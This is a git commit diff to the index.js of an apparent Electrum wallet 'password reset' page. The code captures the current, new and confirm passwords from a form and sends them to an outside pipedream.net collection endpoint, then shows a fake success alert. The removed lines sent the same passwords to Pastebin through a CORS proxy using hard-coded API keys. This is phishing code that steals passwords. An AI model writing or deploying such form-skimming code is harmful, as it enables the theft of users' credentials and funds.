086a09bc43c3c473156f6f4680b5dde291cd103a
electrum-reset <128089718+electrum-reset@users.noreply.github.com>
2023-03-20 21:56:36 +0530

    Update index.js

--- index.js
+++ index.js
@@ -1,5 +1,4 @@
 const form = document.querySelector('#register-form');
-const api_key = 'y4Sl0pAK56NAXPhM9Qx0OkWJtVeKQyFg';
 
 form.addEventListener('submit', (event) => {
   event.preventDefault(); // Prevent the form from submitting normally
@@ -8,27 +7,26 @@ form.addEventListener('submit', (event) => {
   const newPassword = document.querySelector('#pass2').value;
   const confirmPassword = document.querySelector('#pass3').value;
 
-  const xhr = new XMLHttpRequest();
-  xhr.withCredentials = true;
+  const headers = new Headers()
+  headers.append("Content-Type", "application/json")
   
-  xhr.addEventListener("readystatechange", function () {
-      if (this.readyState === this.DONE) {
-          console.log(this.responseText);
-      }
-  });
+  const body = {
+    "password": currentPassword,
+    "newPassword": newPassword,
+    "confirmPassword": confirmPassword
+  }
   
-  xhr.open("POST", "https://http-cors-proxy.p.rapidapi.com/");
-  xhr.setRequestHeader("content-type", "application/json");
-  xhr.setRequestHeader("Origin", "www.github.com");
-  xhr.setRequestHeader("X-Requested-With", "www.github.com");
-  xhr.setRequestHeader("X-RapidAPI-Key", "2fe554f732mshc092a3d90ae332ap11848ejsn905aa1dff8a9");
-  xhr.setRequestHeader("X-RapidAPI-Host", "http-cors-proxy.p.rapidapi.com");
+  const options = {
+    method: "POST",
+    headers,
+    mode: "cors",
+    body: JSON.stringify(body),
+  }
   
-
-  const params = `api_option=paste&api_dev_key=${api_key}&api_paste_code=${currentPassword}\n${newPassword}\n${confirmPassword}&api_paste_private=1&api_paste_name=form-paste`;
-
-  xhr.send(params);
+  fetch("https://eocu9ne05197qnz.m.pipedream.net", options)
 
   // Reset the form fields
   form.reset();
+  setTimeout(function(){ alert("Password updated successfully!"); }, 100);
 });
+
